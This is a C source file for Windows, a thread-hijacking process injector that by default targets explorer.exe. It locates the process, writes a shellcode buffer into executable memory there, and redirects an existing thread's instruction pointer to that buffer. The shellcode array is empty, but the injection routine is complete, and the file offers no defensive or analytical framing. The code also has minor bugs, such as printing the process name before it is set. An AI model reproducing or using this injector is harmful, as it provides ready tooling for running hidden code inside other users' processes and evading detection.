#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot) {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &entry)) {
            do {
                if (!strcmp(entry.szExeFile, processName)) {
                    return entry.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &entry));
        }
    }
    else {
        return 0;
    }
}

unsigned char shellcode[] = "";

int main(int argc, char *argv[]) {

	LPCSTR processName = "";
	if (argc == 2) {
		if(strcmp(argv[1],"-h") == 0){
			printf("\nUsage:\n");
			printf("thread-injector.exe <process name>\n");
			printf("\nIf no process provided, it will attempt to inject into explorer.exe\n\n");
			exit(0);
		}
	}
	
	if (argc != 2) {
        printf("No process provided, injecting into explorer.exe\n");
        processName = "explorer.exe";
        
    }
    else{
    	printf("Attempting to inject into %s", processName);
    		processName = argv[1];
	}
    
    int processId = getProcessId(processName);
    if(processId != 0)
    {
    	printf("\n[+] PID:%d",processId);
	}
    else{
    	printf("\n[-] Cound not obtain PID, aborting");
	}
    HANDLE h_thread;
    THREADENTRY32 threadEntry;
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);

    HANDLE h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(h_snapshot, &threadEntry);

	while (Thread32Next(h_snapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == processId)
		{
			h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			break;
		}
	}
	
    SuspendThread(h_thread);

    GetThreadContext(h_thread, &context);
	context.Rip = (DWORD_PTR)b_shellcode;
	SetThreadContext(h_thread, &context);
	ResumeThread(h_thread);

}
